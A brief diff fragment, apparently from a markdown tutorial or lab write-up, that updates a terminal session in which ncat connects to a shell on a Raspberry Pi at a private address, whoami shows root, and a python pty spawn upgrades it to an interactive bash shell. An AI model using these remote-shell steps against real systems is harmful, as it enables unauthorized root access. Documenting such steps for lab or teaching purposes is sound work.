@@ -166,7 +166,7 @@ user@ip:~$ ncat 192.168.1.104 4433
 whoami
 root
 
-python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 root@raspberrypi:/home/user#
 ```
 
